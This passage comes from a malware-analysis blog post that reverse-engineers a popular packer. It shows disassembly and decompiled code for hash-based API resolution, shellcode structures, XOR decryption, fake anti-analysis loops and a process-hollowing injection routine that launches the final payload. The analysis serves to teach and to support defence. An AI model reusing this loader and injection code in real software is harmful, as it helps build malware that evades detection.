<p>Because he wants at the first the <em><strong>BaseDllName</strong> </em>for getting <em><strong>kernel32.dll</strong></em> We could supposed the shellcode will use the offset 0x2c for having the value but it&#8217;s pointing to 0x30</p>
<pre><code>008F524A | 8B41 30                  | mov eax,dword ptr ds:[ecx+30]   </code></pre>
<p>It means, It will grab buffer pointer from the <a href="https://docs.microsoft.com/en-us/windows/win32/api/subauth/ns-subauth-unicode_string">UNICODE_STRING</a> structure</p>
<pre><code>typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;</code></pre>
<p>After that, the magic appears</p>
<table>
<thead>
<tr>
<th>Register</th>
<th>Address</th>
<th>Symbol Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>EAX</td>
<td>77BB6DB0</td>
<td>L&#8221;ntdll.dll&#8221;</td>
</tr>
</tbody>
</table>
<h4>Homemade checksum algorithm ?</h4>
<p>Searching a library name or function behind its respective hash is a common trick performed in the wild.</p>
<pre><code>00965248 | 8B11                     | mov edx,dword ptr ds:[ecx]                    | Pointer to List Entry (aka pEntry)
0096524A | 8B41 30                  | mov eax,dword ptr ds:[ecx+30]                 | Pointer to BaseDllName buffer 
0096524D | 6A 02                    | push 2                                        | Increment is 2 due to UNICODE value
0096524F | 8B7D 08                  | mov edi,dword ptr ss:[ebp+8]                  |
00965252 | 57                       | push edi                                      | DLL Hash (searched one)
00965253 | 50                       | push eax                                      | DLL Name
00965254 | E8 5B000000              | call 9652B4                                   | Checksum()
00965259 | 85C0                     | test eax,eax                                  |
0096525B | 74 04                    | je 965261                                     |
0096525D | 8BCA                     | mov ecx,edx                                   | pEntry = pEntry-&gt;Flink
0096525F | EB E7                    | jmp 965248                                    |</code></pre>
<p>The checksum function used here seems to have a decent risk of hash collisions, but based on the number of occurrences and length of the strings, it&#8217;s negligible. Otherwise yeah, it could be fucked up very quickly.</p>
<pre><code>BOOL Checksum(PWSTR *pBuffer, int hash, int i)
{
  int pos; // ecx
  int checksum; // ebx
  int c; // edx

  pos = 0;
  checksum = 0;
  c = 0;
  do
  {
    LOBYTE(c) = *pBuffer | 0x60;                // Lowercase
    checksum = 2 * (c + checksum);
    pBuffer += i;                               // +2 due it's UNICODE
    LOBYTE(pos) = *pBuffer;
    --pos;
  }
  while ( *pBuffer &amp;&amp; pos );
  return checksum != hash;
}</code></pre>
<h4>Find the correct function address</h4>
<p>With the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data"><strong>pEntry</strong></a> list saved and the checksum function assimilated, it only needs to perform a loop that repeat the process to get the name of the function, put him into the checksum then comparing it with the one that the packer wants.</p>
<pre><code>00965261 | 8B41 18                  | mov eax,dword ptr ds:[ecx+18]                 | BaseAddress
00965264 | 50                       | push eax                                      |
00965265 | 8B58 3C                  | mov ebx,dword ptr ds:[eax+3C]                 | PE Signature (e_lfanew) RVA
00965268 | 03C3                     | add eax,ebx                                   | pNTHeader = BaseAddress + PE Signature RVA
0096526A | 8B58 78                  | mov ebx,dword ptr ds:[eax+78]                 | Export Table RVA
0096526D | 58                       | pop eax                                       |
0096526E | 50                       | push eax                                      |
0096526F | 03D8                     | add ebx,eax                                   | Export Table
00965271 | 8B4B 1C                  | mov ecx,dword ptr ds:[ebx+1C]                 | Address of Functions RVA
00965274 | 8B53 20                  | mov edx,dword ptr ds:[ebx+20]                 | Address of Names RVA
00965277 | 8B5B 24                  | mov ebx,dword ptr ds:[ebx+24]                 | Address of Name Ordinals RVA
0096527A | 03C8                     | add ecx,eax                                   | Address Table
0096527C | 03D0                     | add edx,eax                                   | Name Pointer Table (NPT)
0096527E | 03D8                     | add ebx,eax                                   | Ordinal Table (OT)
00965280 | 8B32                     | mov esi,dword ptr ds:[edx]                    |
00965282 | 58                       | pop eax                                       |
00965283 | 50                       | push eax                                      | BaseAddress
00965284 | 03F0                     | add esi,eax                                   | Function Name = NPT[i] + BaseAddress
00965286 | 6A 01                    | push 1                                        | Increment to 1 loop
00965288 | FF75 0C                  | push dword ptr ss:[ebp+C]                     | Function Hash (searched one)
0096528B | 56                       | push esi                                      | Function Name
0096528C | E8 23000000              | call 9652B4                                   | Checksum()
00965291 | 85C0                     | test eax,eax                                  |
00965293 | 74 08                    | je 96529D                                     |
00965295 | 83C2 04                  | add edx,4                                     |
00965298 | 83C3 02                  | add ebx,2                                     |
0096529B | EB E3                    | jmp 965280                                    |</code></pre>
<h4>Save the function address</h4>
<p>When the name is matching with the hash in output, so it only requiring now to grab the function address and store into EAX.</p>
<pre><code>0096529D | 58                       | pop eax                                       |
0096529E | 33D2                     | xor edx,edx                                   | Purge
009652A0 | 66:8B13                  | mov dx,word ptr ds:[ebx]                      |
009652A3 | C1E2 02                  | shl edx,2                                     | Ordinal Value
009652A6 | 03CA                     | add ecx,edx                                   | Function Address RVA
009652A8 | 0301                     | add eax,dword ptr ds:[ecx]                    | Function Address = BaseAddress + Function Address RVA
009652AA | 59                       | pop ecx                                       |
009652AB | 5F                       | pop edi                                       |
009652AC | 5E                       | pop esi                                       |
009652AD | 5B                       | pop ebx                                       |
009652AE | 8BE5                     | mov esp,ebp                                   |
009652B0 | 5D                       | pop ebp                                       |
009652B1 | C2 0800                  | ret 8                                         |</code></pre>
<h3>Road to the second shellcode ! \o/</h3>
<h4>Saving API into a structure</h4>
<p>Now that <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya"><strong>LoadLibraryA</strong></a> and <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress"><strong>GetProcAddress</strong></a> are saved, it only needs to select the function name it wants and putting it into the routine explain above.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="3181" data-permalink="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/stack_strings/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/stack_strings.png?fit=688%2C202&amp;ssl=1" data-orig-size="688,202" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="stack_strings" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/stack_strings.png?fit=300%2C88&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/stack_strings.png?fit=688%2C202&amp;ssl=1" class="aligncenter size-full wp-image-3181" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/stack_strings.png?resize=688%2C202&#038;ssl=1" alt="" width="688" height="202" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/stack_strings.png?w=688&amp;ssl=1 688w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/stack_strings.png?resize=300%2C88&amp;ssl=1 300w" sizes="auto, (max-width: 688px) 100vw, 688px" /></p>
<p>In the end, the shellcode is completely setup</p>
<pre><code>struct SHELLCODE
{
  _BYTE Start;
  SCHEADER *ScHeader;
  int ScStartOffset;
  int seed;
  int (__stdcall *pLoadLibraryA)(int *);
  int (__stdcall *pGetProcAddress)(int, int *);
  PVOID GlobalAlloc;
  PVOID GetLastError;
  PVOID Sleep;
  PVOID VirtuaAlloc;
  PVOID CreateToolhelp32Snapshot;
  PVOID Module32First;
  PVOID CloseHandle;
};

struct SCHEADER
{
  _DWORD dwSize;
  _DWORD dwSeed;
  _BYTE option;
  _DWORD dwDecompressedSize;
};</code></pre>
<h4>Abusing fake loops</h4>
<p>Something that i really found cool in this packer is how the fake loop are funky. They have no sense but somehow they are working and it&#8217;s somewhat amazing. The more absurd it is, the more i like and i found this really clever.</p>
<pre><code>int __cdecl ExecuteShellcode(SHELLCODE *sc)
{
  unsigned int i; // ebx
  int hModule; // edi
  int lpme[137]; // [esp+Ch] [ebp-224h] BYREF

  lpme[0] = 0x224;
  for ( i = 0; i &lt; 0x64; ++i )
  {
    if ( i )
      (sc-&gt;Sleep)(100);
    hModule = (sc-&gt;CreateToolhelp32Snapshot)(TH32CS_SNAPMODULE, 0);
    if ( hModule != -1 )
      break;
    if ( (sc-&gt;GetLastError)() != 24 )
      break;
  }
  if ( (sc-&gt;Module32First)(hModule, lpme) )
    JumpToShellcode(sc); // &lt;------ This is where to look :)
  return (sc-&gt;CloseHandle)(hModule);
}</code></pre>
<h4>Allocation &amp; preparing new shellcode</h4>
<pre><code>void __cdecl JumpToShellcode(SHELLCODE *SC)
{
  int i; 
  unsigned __int8 *lpvAddr; 
  unsigned __int8 *StartOffset; 

  StartOffset = SC-&gt;ScStartOffset;
  Decrypt(SC, StartOffset, SC-&gt;ScHeader-&gt;dwSize, SC-&gt;ScHeader-&gt;Seed);
  if ( SC-&gt;ScHeader-&gt;Option )
  {
    lpvAddr = (SC-&gt;VirtuaAlloc)(0, *(&amp;SC-&gt;ScHeader-&gt;dwDecompressSize), 4096, 64);
    i = 0;
    Decompress(StartOffset, SC-&gt;ScHeader-&gt;dwDecompressSize, lpvAddr, i);
    StartOffset = lpvAddr;
    SC-&gt;ScHeader-&gt;CompressSize = i;
  }
  __asm { jmp     [ebp+StartOffset] }</code></pre>
<h4>Decryption &amp; Decompression</h4>
<p>The decryption is even simpler than the one for the first stage by using a simple re-implementation of the <a href="https://stackoverflow.com/questions/1026327/what-common-algorithms-are-used-for-cs-rand"><strong>ms_rand </strong></a>function, with a set seed value grabbed from the shellcode structure, that i decided to call here <strong>SCHEADER</strong>. </p>
<pre>int Decrypt(SHELLCODE *sc, int startOffset, unsigned int size, int s)<br />{<br />  int seed; // eax<br />  unsigned int count; // esi<br />  _BYTE *v6; // edx<br /><br />  seed = s;<br />  count = 0;<br />  for ( API-&gt;seed = s; count &lt; size; ++count )<br />  {<br />    seed = ms_rand(sc);<br />    *v6 ^= seed;<br />  }<br />  return seed;<br />}</pre>
<p style="text-align: center;"><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="3141" data-permalink="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/charlotte_meme/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/charlotte_meme.png?fit=488%2C485&amp;ssl=1" data-orig-size="488,485" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="charlotte_meme" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/charlotte_meme.png?fit=300%2C298&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/charlotte_meme.png?fit=488%2C485&amp;ssl=1" class="aligncenter size-full wp-image-3141" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/charlotte_meme.png?resize=488%2C485&#038;ssl=1" alt="" width="488" height="485" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/charlotte_meme.png?w=488&amp;ssl=1 488w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/charlotte_meme.png?resize=300%2C298&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/charlotte_meme.png?resize=150%2C150&amp;ssl=1 150w" sizes="auto, (max-width: 488px) 100vw, 488px" /><em>XOR everywhere \o/</em></p>
<p>Then when it&#8217;s done, it only needs to be decompressed.</p>
<p style="text-align: center;"><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="3144" data-permalink="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/shellcode_01_ukn/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Ukn.png?fit=1220%2C624&amp;ssl=1" data-orig-size="1220,624" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Shellcode_01_Ukn" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Ukn.png?fit=300%2C153&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Ukn.png?fit=900%2C461&amp;ssl=1" class="aligncenter size-full wp-image-3144" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Ukn.png?resize=900%2C460&#038;ssl=1" alt="" width="900" height="460" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Ukn.png?w=1220&amp;ssl=1 1220w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Ukn.png?resize=300%2C153&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Ukn.png?resize=1024%2C524&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Ukn.png?resize=768%2C393&amp;ssl=1 768w" sizes="auto, (max-width: 900px) 100vw, 900px" /><em>Decrypted shellcode entering into the decompression loop</em></p>
<h3>Stage 3 &#8211; Launching the payload</h3>
<p>Reaching finally the final stage of this packer. This is the exact same pattern like the first shellcode:</p>
<ul>
<li>Find &amp; Stored GetProcAddress &amp; Load Library</li>
<li>Saving all WinAPI functions required</li>
<li>Pushing the payload</li>
</ul>
<p>The structure from this one is a bit longer</p>
<pre><code>struct SHELLCODE
{
  PVOID (__stdcall *pLoadLibraryA)(LPCSTR);
  PVOID (__stdcall *pGetProcAddress)(HMODULE, LPSTR);
  char notused;
  PVOID ScOffset;
  PVOID LoadLibraryA;
  PVOID MessageBoxA;
  PVOID GetMessageExtraInfo;
  PVOID hKernel32;
  PVOID WinExec;
  PVOID CreateFileA;
  PVOID WriteFile;
  PVOID CloseHandle;
  PVOID CreateProcessA;
  PVOID GetThreadContext;
  PVOID VirtualAlloc;
  PVOID VirtualAllocEx;
  PVOID VirtualFree;
  PVOID ReadProcessMemory;
  PVOID WriteProcessMemory;
  PVOID SetThreadContext;
  PVOID ResumeThread;
  PVOID WaitForSingleObject;
  PVOID GetModuleFileNameA;
  PVOID GetCommandLineA;
  PVOID RegisterClassExA;
  PVOID CreateWindowA;
  PVOID PostMessageA;
  PVOID GetMessageA;
  PVOID DefWindowProcA;
  PVOID GetFileAttributesA;
  PVOID hNtdll;
  PVOID NtUnmapViewOfSection;
  PVOID NtWriteVirtualMemory;
  PVOID GetStartupInfoA;
  PVOID VirtualProtectEx;
  PVOID ExitProcess;
};</code></pre>
<p>Interestingly, the stack string trick is different from the first stage</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="3180" data-permalink="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/stack_strings_stage2/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Stack_strings_Stage2.png?fit=717%2C367&amp;ssl=1" data-orig-size="717,367" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Stack_strings_Stage2" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Stack_strings_Stage2.png?fit=300%2C154&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Stack_strings_Stage2.png?fit=717%2C367&amp;ssl=1" class="aligncenter size-full wp-image-3180" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Stack_strings_Stage2.png?resize=717%2C367&#038;ssl=1" alt="" width="717" height="367" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Stack_strings_Stage2.png?w=717&amp;ssl=1 717w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Stack_strings_Stage2.png?resize=300%2C154&amp;ssl=1 300w" sizes="auto, (max-width: 717px) 100vw, 717px" /></p>
<h4>Fake loop once, fake loop forever</h4>
<p>At this rate now, you understood, that almost everything is a lie in this packer. We have another perfect example here, with a fake loop consisting of checking a non-existent file attribute where in the reality, the variable &#8220;j&#8221; is the only one that have a sense.</p>
<pre><code>void __cdecl _Inject(SC *sc)
{
  LPSTRING lpFileName; // [esp+0h] [ebp-14h]
  char magic[8]; 
  unsigned int j; 
  int i; 

  strcpy(magic, "apfHQ");
  j = 0;
  i = 0;
  while ( i != 111 )
  {
    lpFileName = (sc-&gt;GetFileAttributesA)(magic);
    if ( j &gt; 1 &amp;&amp; lpFileName != 0x637ADF )
    {
      i = 111;
      SetupInject(sc);
    }
    ++j;
  }
}</code></pre>
<h4>Good ol&#8217; remote thread hijacking</h4>
<p>Then entering into the Inject setup function, no need much to say, the remote thread hijacking trick is used for executing the final payload.</p>
<pre><code>  ScOffset = sc-&gt;ScOffset;
  pNtHeader = (ScOffset-&gt;e_lfanew + sc-&gt;ScOffset);
  lpApplicationName = (sc-&gt;VirtualAlloc)(0, 0x2800, 0x1000, 4);
  status = (sc-&gt;GetModuleFileNameA)(0, lpApplicationName, 0x2800);
  
  if ( pNtHeader-&gt;Signature == 0x4550 ) // "PE"
  {
    (sc-&gt;GetStartupInfoA)(&amp;lpStartupInfo);
    lpCommandLine = (sc-&gt;GetCommandLineA)(0, 0, 0, 0x8000004, 0, 0, &amp;lpStartupInfo, &amp;lpProcessInformation);
    status = (sc-&gt;CreateProcessA)(lpApplicationName, lpCommandLine);
    if ( status )
    {
      (sc-&gt;VirtualFree)(lpApplicationName, 0, 0x8000);
      lpContext = (sc-&gt;VirtualAlloc)(0, 4, 4096, 4);
      lpContext-&gt;ContextFlags = &amp;loc_10005 + 2;
      status = (sc-&gt;GetThreadContext)(lpProcessInformation.hThread, lpContext);
      if ( status )
      {
        (sc-&gt;ReadProcessMemory)(lpProcessInformation.hProcess, lpContext-&gt;Ebx + 8, &amp;BaseAddress, 4, 0);
        if ( BaseAddress == pNtHeader-&gt;OptionalHeader.ImageBase )
          (sc-&gt;NtUnmapViewOfSection)(lpProcessInformation.hProcess, BaseAddress);
        lpBaseAddress = (sc-&gt;VirtualAllocEx)(
                          lpProcessInformation.hProcess,
                          pNtHeader-&gt;OptionalHeader.ImageBase,
                          pNtHeader-&gt;OptionalHeader.SizeOfImage,
                          0x3000,
                          0x40);
        (sc-&gt;NtWriteVirtualMemory)(
          lpProcessInformation.hProcess,
          lpBaseAddress,
          sc-&gt;ScOffset,
          pNtHeader-&gt;OptionalHeader.SizeOfHeaders,
          0);
        for ( i = 0; i &lt; pNtHeader-&gt;FileHeader.NumberOfSections; ++i )
        {
          Section = (ScOffset-&gt;e_lfanew + sc-&gt;ScOffset + 40 * i + 248);
          (sc-&gt;NtWriteVirtualMemory)(
            lpProcessInformation.hProcess,
            Section[1].Size + lpBaseAddress,
            Section[2].Size + sc-&gt;ScOffset,
            Section[2].VirtualAddress,
            0);
        }
        (sc-&gt;WriteProcessMemory)(
          lpProcessInformation.hProcess,
          lpContext-&gt;Ebx + 8,
          &amp;pNtHeader-&gt;OptionalHeader.ImageBase,
          4,
          0);
        lpContext-&gt;Eax = pNtHeader-&gt;OptionalHeader.AddressOfEntryPoint + lpBaseAddress;
        (sc-&gt;SetThreadContext)(lpProcessInformation.hThread, lpContext);
        (sc-&gt;ResumeThread)(lpProcessInformation.hThread);
        (sc-&gt;CloseHandle)(lpProcessInformation.hThread);
        (sc-&gt;CloseHandle)(lpProcessInformation.hProcess);
        status = (sc-&gt;ExitProcess)(0);
      }
    }
  }</code></pre>
<h2>Same but different, but still the same</h2>
<p>As explained at the beginning, whenever you have reversed this packer, you understand that the core is pretty similar every-time. It took only few seconds, to breakpoints at specific places to reach the shellcode stage(s).</p>
<p style="text-align: center;"><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="3139" data-permalink="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/other_payload_01/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_01.png?fit=721%2C212&amp;ssl=1" data-orig-size="721,212" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Other_Payload_01" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_01.png?fit=300%2C88&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_01.png?fit=721%2C212&amp;ssl=1" class="aligncenter size-full wp-image-3139" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_01.png?resize=721%2C212&#038;ssl=1" alt="" width="721" height="212" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_01.png?w=721&amp;ssl=1 721w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_01.png?resize=300%2C88&amp;ssl=1 300w" sizes="auto, (max-width: 721px) 100vw, 721px" /><em>Identifying core pattern (LocalAlloc, Module Handle and VirtualProtect)</em></p>
<p>The funny is on the decryption used now in the first stage, it&#8217;s the exact copy pasta from the shellcode side.</p>
<p style="text-align: center;"><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="3138" data-permalink="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/other_payload_02/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_02.png?fit=702%2C169&amp;ssl=1" data-orig-size="702,169" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Other_Payload_02" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_02.png?fit=300%2C72&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_02.png?fit=702%2C169&amp;ssl=1" class="aligncenter size-full wp-image-3138" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_02.png?resize=702%2C169&#038;ssl=1" alt="" width="702" height="169" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_02.png?w=702&amp;ssl=1 702w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_02.png?resize=300%2C72&amp;ssl=1 300w" sizes="auto, (max-width: 702px) 100vw, 702px" /><em>TEA decryption replaced with rand() + xor like the first shellcode stage</em></p>
<p>At the start of the second stage, there is not so much to say that the instructions are almost identical</p>
<p style="text-align: center;"><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="3137" data-permalink="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/other_payload_03/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_03.png?fit=1672%2C271&amp;ssl=1" data-orig-size="1672,271" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Other_Payload_03" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_03.png?fit=300%2C49&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_03.png?fit=900%2C146&amp;ssl=1" class="aligncenter size-full wp-image-3137" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_03.png?resize=900%2C146&#038;ssl=1" alt="" width="900" height="146" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_03.png?w=1672&amp;ssl=1 1672w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_03.png?resize=300%2C49&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_03.png?resize=1024%2C166&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_03.png?resize=768%2C124&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Other_Payload_03.png?resize=1536%2C249&amp;ssl=1 1536w" sizes="auto, (max-width: 900px) 100vw, 900px" /><em>Shellcode n°1 is identical into two different campaign waves</em></p>
<p>It seems that the second shellcode changed few hours ago (at the date of this paper), so let&#8217;s see if other are motivated to make their own analysis of it</p>
<h1>Conclusion</h1>
<p>Well well, it&#8217;s cool sometimes to deal with something easy but efficient. It has indeed surprised me to see that the core is identical over the time but I insist this packer<em><strong> is really awesome for training and teaching someone into malware/reverse engineering</strong></em>.</p>
<p>Well, now it&#8217;s time to go serious for the next release 🙂</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="3179" data-permalink="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/kazuma/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/kazuma.gif?fit=500%2C273&amp;ssl=1" data-orig-size="500,273" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="kazuma" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/kazuma.gif?fit=300%2C164&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/kazuma.gif?fit=500%2C273&amp;ssl=1" class="aligncenter size-full wp-image-3179" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/kazuma.gif?resize=500%2C273&#038;ssl=1" alt="" width="500" height="273" /></p>
<p>Stay safe in those weird times o/</p>


<p></p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-3128" class="share-twitter sd-button share-icon" href="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/?share=twitter" target="_blank" title="Click to share on Twitter" ><span>Twitter</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-3128" class="share-facebook sd-button share-icon" href="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/?share=facebook" target="_blank" title="Click to share on Facebook" ><span>Facebook</span></a></li><li class="share-end"></li></ul></div></div></div><div class='sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded' id='like-post-wrapper-140610880-3128-676227308eb68' 